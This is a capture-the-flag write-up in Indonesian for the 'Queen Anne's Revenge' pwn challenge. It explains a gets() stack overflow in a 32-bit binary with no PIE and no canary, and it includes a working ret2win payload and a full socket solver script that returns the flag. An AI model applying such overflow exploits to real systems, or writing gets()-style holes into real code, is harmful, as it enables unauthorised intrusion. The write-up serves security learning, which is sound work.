# Queen Anne's Revenge

Author: adieos — Pwn — 65 solves

```
Queen_Anne_s_Revenge.tar.gz -> chall (ELF 32-bit i386) + main.c + Dockerfile
```

## Ringkasan

Program minta nama bajak laut + PIN. Source code dikasih, dan di situ ada logika mustahil: `access()` cuma mau ngasih flag kalau `pin == 1234`, tapi `access()` cuma pernah dipanggil dengan `pin == 123` (dari cabang "blackbeard"). Untungnya ada `gets(piratename)` → **buffer overflow ret2win**, dan binary-nya no PIE + no canary. Tinggal timpa return address `menu()` dengan `access(1234)`.

Flag: `JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}`

## Analisis

### Source (poin pentingnya)

```c
void access(int pin) {
    if (pin == 1234) { fopen("flag.txt"); ...; printf(...); }   // ← mau ke sini
}

void menu() {
    char piratename[15];
    int pin;
    ...
    gets(piratename);      // ← overflow
    printf(piratename);
    ...
    gets(&pin);
    if ((strcmp(piratename, "blackbeard") == 0) && pin == 123) {
        access(pin);       // ← pin = 123, padahal butuh 1234
    }
    ...
}
```

Cabang yang manggil `access` cuma jalan kalau `pin == 123`, sementara `access` cuma print flag kalau `pin == 1234`. Kontradiksi → nggak mungkin lewat alur normal, harus ret2win.

### Layout stack & offset

Disassembly `menu()`:

```asm
push ebp
mov  ebp, esp
push ebx
sub  esp, 0x24
...
lea  eax, [ebp-0x17]   ; gets(piratename) → piratename di ebp-0x17
...
lea  eax, [ebp-0x1c]   ; gets(&pin) → pin di ebp-0x1c
```

- `piratename` = `ebp-0x17`, jarak ke saved return address = 0x17 + 4 (saved ebp) = **27 byte**
- Binary ELF 32-bit **EXEC (no PIE)** dan tanpa canary
- `access` ada di `0x080491e6`

Karena `menu()` cdecl, `access` bakal baca argumen `1234` dari stack — posisinya persis di belakang return address yang kita kontrol.

### Exploit

```python
payload = b"A" * 27
payload += p32(0x080491e6)   # return ke access
payload += p32(0x080493a5)   # return address "palsu" setelah access selesai (main)
payload += p32(1234)         # argumen access → pin == 0x4d2
```

Alur setelah kirim payload:
1. `gets(piratename)` nutup-nutupin stack sampai saved return address
2. prompt PIN muncul, jawab apa aja (misal `1`) biar `gets(&pin)` nggak ngerusak payload di area ret — `pin` ada di address lebih rendah, 2 byte input nggak nyampe ke ret
3. `menu()` selesai (jalan ke cabang "landlubber" karena nama udah ketimpa), `ret` → lompat ke `access`
4. `access(1234)` buka `flag.txt`, print flag

Catatan: `printf(piratename)` yang format-string juga ada, tapi nggak kepake — overflow aja cukup.

## Solver

```python
import socket
import struct

HOST, PORT = "165.22.100.192", <port>
ACCESS = 0x080491E6
MAIN = 0x080493A5
p32 = lambda v: struct.pack("<I", v)

payload = b"A" * 27 + p32(ACCESS) + p32(MAIN) + p32(1234)

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(10)
f = s.makefile("rb")
buf = b""
while b"identify yerself" not in buf:
    c = f.read(1)
    if not c:
        break
    buf += c
print(buf.decode(errors="replace"))

s.sendall(payload + b"\n")
buf = b""
while b"PIN:" not in buf:
    c = f.read(1)
    if not c:
        break
    buf += c
print(buf.decode(errors="replace"))

s.sendall(b"1\n")
buf = b""
while True:
    try:
        c = f.read(1)
    except socket.timeout:
        break
    if not c:
        break
    buf += c
print(buf.decode(errors="replace"))
s.close()
```

```
$ python3 exploit.py
QUEEN ANNE'S REVENGE: Brig Treasure
ye want riches? well then,
identify yerself, ye scallywag:
hand over yer PIN:
Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
Here be yer treasure, matey:
JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}
```
